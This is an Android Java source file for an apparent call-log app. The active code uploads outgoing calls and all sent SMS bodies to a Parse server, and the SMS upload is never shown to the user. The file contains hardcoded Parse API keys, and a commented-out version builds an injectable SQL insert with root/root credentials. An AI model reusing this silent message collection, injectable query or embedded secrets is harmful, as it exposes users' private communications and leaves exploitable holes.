/*package com.example.calllog;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.sql.Connection;
import java.sql.Date;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;
import java.text.SimpleDateFormat;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.database.Cursor;
import android.os.Bundle;
import android.provider.CallLog;
import android.view.Menu;
import android.widget.TextView;

public class MainActivity extends Activity {

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);

		getCallDetails();
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}


	@SuppressLint("SimpleDateFormat")
	private void getCallDetails() {

		String phNumber=null,callType=null,callDate=null,date_str=null,callDuration=null;

		String dir = null;

		TextView tv = (TextView)findViewById(R.id.text);
		StringBuffer sb = new StringBuffer();
		Cursor managedCursor = managedQuery( CallLog.Calls.CONTENT_URI,null, null,null, null);
		int number = managedCursor.getColumnIndex( CallLog.Calls.NUMBER ); 
		int type = managedCursor.getColumnIndex( CallLog.Calls.TYPE );
		int date = managedCursor.getColumnIndex( CallLog.Calls.DATE);
		int duration = managedCursor.getColumnIndex( CallLog.Calls.DURATION);
		sb.append( "Call Details :");
		while ( managedCursor.moveToNext() ) {
		phNumber = managedCursor.getString( number );
		callType = managedCursor.getString( type );
		callDate = managedCursor.getString( date );

		Date callDayTime = new Date(Long.valueOf(callDate));
		SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");

		date_str = sdf.format(callDayTime);

		callDuration = managedCursor.getString( duration );


		int dircode = Integer.parseInt( callType );

		switch( dircode ) {
		case CallLog.Calls.OUTGOING_TYPE:
		dir = "OUTGOING";
		break;

		case CallLog.Calls.INCOMING_TYPE:
		{
		dir = "INCOMING";
		break;
		}
		case CallLog.Calls.MISSED_TYPE:
		dir = "MISSED";
		break;
		}
		sb.append( "\nPhone Number:--- "+phNumber +" \nCall Type:--- "+dir+" \nCall Date:--- "+date_str+" \nCall duration in sec :--- "+callDuration );
		sb.append("\n----------------------------------");
		writeToDB(phNumber, dir,date_str,callDuration);
		}
		managedCursor.close();
		tv.setText(sb);


		}

		void writeToDB(String phNumber,String dir, String date_str,String callDuration){

			String jdbcURL = "jdbc:mysql://localhost:3306/call_log";
			//private static final String jdbcURL = "jdbc:oracle:thin:@//localhost:1521/xe";
			BufferedReader bufferRead = new BufferedReader(new InputStreamReader(System.in));

			// Put your oracle ID and password here
			String user = "root";
			String password = "root";

			Connection connection = null;
			Statement statement = null;
			ResultSet result = null;

			try {


			Class.forName("com.mysql.jdbc.Driver");
			connection = DriverManager.getConnection(jdbcURL, user, password);
			statement = connection.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,ResultSet.CONCUR_UPDATABLE);

			String sql = "insert into Records values('"+ phNumber + "','" + dir+"','" +date_str+"','"+callDuration +"');";

			System.out.println(sql);
			result =statement.executeQuery(sql);


			} catch (ClassNotFoundException e) {
			e.printStackTrace();
			} catch (SQLException e) {
			e.printStackTrace();
			}

		}
}
 */

package com.example.calllog;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.sql.Date;
import java.text.SimpleDateFormat;
import java.util.List;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.provider.CallLog;
import android.telephony.TelephonyManager;
import android.text.method.ScrollingMovementMethod;
import android.util.Log;
import android.view.Menu;
import android.widget.TextView;

import com.parse.FindCallback;
import com.parse.Parse;
import com.parse.ParseException;
import com.parse.ParseObject;
import com.parse.ParseQuery;

public class MainActivity extends Activity {

	public String myPhoneNumber= null;
	ParseObject OutgoingCalls = null;
	ParseObject OutgoingSMSs = null;
	TextView content;
	StringBuffer sb;
	
	public MainActivity(){
		
		sb = new StringBuffer();
	}

	@Override
	protected void onCreate(Bundle savedInstanceState) {


		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		content = (TextView) findViewById(R.id.text);
		content.setMovementMethod(new ScrollingMovementMethod());
		Parse.initialize(this, "pPowuNIyQqkuCJaexMKnhAlbzDbTa1mi2qRqjSsk", "o3d6OdaXbwbHpenQvKUSu7E5NrtsWMZuD6cpkPvc");
		getCallDetails();
		//inSms();
	    outSms();

	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}


	@SuppressLint({ "SimpleDateFormat", "SdCardPath" })
	private void getCallDetails() {

		String FILENAME = "position_file";
		String phNumber=null,callType=null,callDate=null,date_str=null,callDuration=null;
		Integer position=-1;
		Integer count = 0;
		boolean newFile = true;
		int flag=0;
		
		// create a File object for the parent directory
		// Remember that this requires a SD card to be present
		// If no SD card is present, it will fail to create
		// any position counter file, forcing re-sending of 
		// all data again. This might result in duplication
		// of data on server. 
		// To correct this, either add support for a local
		// directory in case sd card is not present
		// or completely remove sd card support.
		File directory = new File("/sdcard/CallDetails/");
		// have the object build the directory structure, if needed.
		directory.mkdirs();		
		String dir = null;
		File file = new File(directory,FILENAME);

		//To get the caller's phone number
		final Context context = getApplicationContext();
		TelephonyManager tMgr = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
		myPhoneNumber = tMgr.getLine1Number();


		TextView tv = (TextView)findViewById(R.id.text);
		StringBuffer sb = new StringBuffer();
		@SuppressWarnings("deprecation")
		Cursor managedCursor = managedQuery( CallLog.Calls.CONTENT_URI,null, null,null, null);

		/*
		 * To get details from Call log
		 * */
		int number = managedCursor.getColumnIndex( CallLog.Calls.NUMBER ); 
		int type = managedCursor.getColumnIndex( CallLog.Calls.TYPE );
		int date = managedCursor.getColumnIndex( CallLog.Calls.DATE);
		int duration = managedCursor.getColumnIndex( CallLog.Calls.DURATION);


		try {

			FileInputStream fis = new FileInputStream(file);
			InputStreamReader inputStreamReader = new InputStreamReader(fis);
			BufferedReader bufferedReader = new BufferedReader(inputStreamReader);
			String str = bufferedReader.readLine(); 
			position = Integer.parseInt(str);
			Log.d("logsValue", "Current value in file is: " + position);
			fis.close();
			newFile = false;

		} catch (Exception e) {
			Log.d("fileExists", "Error opening file. File doesn't exist or some other error. Here is the stackTrace: \n" + e.toString() + "\nWill try to create a new file");
			e.printStackTrace();
		}

		sb.append( "Call Details :");

		if (!newFile)
			managedCursor.moveToPosition(position);

		try
		{
			while ( managedCursor.moveToNext() ) {
				
				flag=1;
				position=managedCursor.getPosition();
				
				phNumber = managedCursor.getString( number );
				callType = managedCursor.getString( type );
				callDate = managedCursor.getString( date );

				Date callDayTime = new Date(Long.valueOf(callDate));
				SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
				date_str = sdf.format(callDayTime);

				callDuration = managedCursor.getString( duration );


				int dircode = Integer.parseInt( callType );

				switch( dircode ) {
				case CallLog.Calls.OUTGOING_TYPE:{
					dir = "OUTGOING";
					break;
				}
				case CallLog.Calls.INCOMING_TYPE:{
					dir = "INCOMING";
					break;
				}
				case CallLog.Calls.MISSED_TYPE:{
					dir = "MISSED";
					break;
				}

				}

				/*
				 * To upload the call details to Parse
				 * */
				OutgoingCalls = new ParseObject("OutgoingCalls");
				if (dir.equalsIgnoreCase("Outgoing") && flag==1)
				{
						sb.append( "\nPhone Number:--- "+phNumber +" \nCall Type:--- "+dir+" \nCall Date:--- "+date_str+" \nCall duration in sec :--- "+callDuration );
						sb.append("\n----------------------------------");
						OutgoingCalls.put("Source", myPhoneNumber);
						OutgoingCalls.put("Destination", phNumber);
				
					/*else
					{
						testObject.put("Destination", myPhoneNumber);
						testObject.put("Source", phNumber);
					}*/
					OutgoingCalls.put("dir", dir);
					OutgoingCalls.put("date_str", date_str);
					OutgoingCalls.put("callDuration", callDuration);
					OutgoingCalls.saveInBackground();
					count++;
				}
			}//while
			if(flag==0){
				
				sb.append("No new logs to be displayed");
			}
		}
		catch (Exception e)
		{
			Log.d("logsPush", "Error occurred while reading Call Manager and/or pushing to server. " +
					"This can happen if there is a problem with creation of Test object or some other " +
					"error on the server like trying to insert duplicate value." +
					"Stack trace follows:\n" + e.toString());
		}
		//Log number of objects successfully pushed to server.
		Log.d("logsPush", "Pushed " + count + " objects to server successfully!");
		try {

			FileOutputStream fos = new FileOutputStream(file);
			byte[] buffer = position.toString().getBytes();
			fos.write(buffer);
			fos.close();			
			Log.d("fileWrite", "Writing position: " + position + " succeeded. :)");

		} catch (Exception e) {
			Log.d("fileWrite", "Writing position: " + position + " failed!");
			e.printStackTrace();
		}

		managedCursor.close();
		tv.setText(sb);
		
		
		// Now let us try to query the Parse data base for something and
		// output the result to logcat. This code can later be modified
		// to retrieve stuff from Parse in order to formulate a request
		// to Google charting API which would return a graph that can
		// be displayed on the phone.
		ParseQuery query = new ParseQuery("TestObject");
		query.whereEqualTo("Source", myPhoneNumber);
		query.findInBackground(new FindCallback() {
		    public void done(List<ParseObject> dataObjects, ParseException e) {
		        if (e == null) {
		            Log.d("query", "Found " + dataObjects.size() + " calls made by me.");
		        } else {
		            Log.d("query", "Error: " + e.getMessage());
		        }
		    }
		});
	}//getCallDetails
	    
	 @SuppressLint("SdCardPath")
	private void outSms() {
		 
		 	String FILENAME = "outSMS";
			Integer outPosition = -1;
			File directory = new File("/sdcard/SMSDetails/");
			// have the object build the directory structure, if needed.
			directory.mkdirs();		
			File file = new File(directory,FILENAME);
			boolean newFile = true;
			
			String address=null,date=null,body=null;
			
			try {

				FileInputStream fis = new FileInputStream(file);
				InputStreamReader inputStreamReader = new InputStreamReader(fis);
				BufferedReader bufferedReader = new BufferedReader(inputStreamReader);
				String str = bufferedReader.readLine(); 
				outPosition = Integer.parseInt(str);
				Log.d("SMSlogsValue", "Current value in outSMS file is: " + outPosition);
				fis.close();
				newFile = false;

			} catch (Exception e) {
				Log.d("SMSOUTfileExists", "Error opening file. File doesn't exist or some other error. Here is the stackTrace: \n" + e.toString() + "\nWill try to create a new file");
				e.printStackTrace();
			}
			
		    Cursor cursor = getContentResolver().query(Uri.parse("content://sms/sent"), null, null, null, null);
		    if (!newFile)
				cursor.moveToPosition(outPosition);

			    while(cursor.moveToNext()){
			    	
			      outPosition = cursor.getPosition();
			      
			      address = cursor.getString(cursor.getColumnIndex("address"));
			      date = cursor.getString(cursor.getColumnIndex("date"));
			      body = cursor.getString(cursor.getColumnIndex("body"));
			      
			      OutgoingSMSs = new ParseObject("OutgoingSMSs");
			     
					OutgoingSMSs.put("Destination", address);
					OutgoingSMSs.put("Source", myPhoneNumber);
					OutgoingSMSs.put("date", date);
					OutgoingSMSs.put("body", body);
					OutgoingSMSs.saveInBackground();
			      
			    }//while
			    
			    
			    try {

					FileOutputStream fos = new FileOutputStream(file);
					byte[] buffer = outPosition.toString().getBytes();
					fos.write(buffer);
					fos.close();			
					Log.d("fileWrite", "Writing sent position: " + outPosition + " succeeded. :)");

				} catch (Exception e) {
					Log.d("fileWrite", "Writing sent position: " + outPosition + " failed!");
					e.printStackTrace();
				}
			    cursor.close();
	    }//outSMS
}